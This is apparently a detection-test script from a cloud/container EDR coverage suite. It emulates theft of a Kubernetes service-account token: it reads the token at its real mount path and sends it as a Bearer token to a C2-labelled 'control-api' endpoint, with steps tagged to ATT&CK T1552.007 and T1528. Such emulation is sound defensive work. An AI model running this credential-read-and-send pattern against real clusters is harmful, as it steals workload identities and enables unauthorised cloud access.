#!/bin/bash
#
# run-workload-identity-theft.sh
# ---------------------------------------------------------------------------
# CLOUD/CONTAINER EDR (CDR) DETECTION COVERAGE — NON-PRODUCTION USE ONLY
#
# Emulates theft and reuse of a Kubernetes/cloud workload-identity token —
# the container-native sibling of the IMDS-credential-theft scenario.
# Reads the decoy service-account token seeded by seed-decoys.sh at its
# REAL mount path, then presents it as a Bearer token to the environment's decoy
# cloud/K8s token-exchange endpoint (control-api's /cloud/identity). The token
# is decoy content with a JWT-shaped encoding, not a usable credential.
#
#   discover workload-identity token file    Unsecured Credentials: Container API (T1552.007)
#   present stolen token to a cloud API       Steal Application Access Token       (T1528)
# ---------------------------------------------------------------------------
set -u
source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"

RESULTS_DIR="${RESULTS_DIR:-/home/root/results}"
C2_HOST="${C2_HOST:-control-api}"
C2_PORT="${C2_PORT:-8443}"
SA_DIR="/var/run/secrets/kubernetes.io/serviceaccount"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/identitytheft_${SESSION}.log"

mkdir -p "$RESULTS_DIR"
say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

say "Cymylau :: workload-identity-theft emulation :: session=$SESSION"

step "discovery — find the mounted workload-identity token (ATT&CK T1552.007)"
if [ ! -f "${SA_DIR}/token" ]; then
    say "!! no decoy token found — run: bash playbooks/seed-decoys.sh first"
    exit 1
fi
find /var/run/secrets -type f 2>/dev/null | tee -a "$LOG"
st_mark T1552.007 "read-token"; act_here "cat service-account token" "${SA_DIR}/token"
TOKEN="$(cat "${SA_DIR}/token")"
NAMESPACE="$(cat "${SA_DIR}/namespace" 2>/dev/null || echo unknown)"
say "discovered token for namespace='${NAMESPACE}' (${#TOKEN} chars)"

step "credential use — present stolen token to a cloud/K8s API (ATT&CK T1528)"
st_mark T1528 "token-exchange"
RESP="$(st_http POST "http://${C2_HOST}:${C2_PORT}/cloud/identity" "namespace=${NAMESPACE}" "Authorization: Bearer ${TOKEN}")"
say "token-exchange response: $RESP"

step "Done — workload-identity-theft emulation complete."
say "artifacts: $LOG  (server-side log: results/control_api_beacons.log)"

act_summary
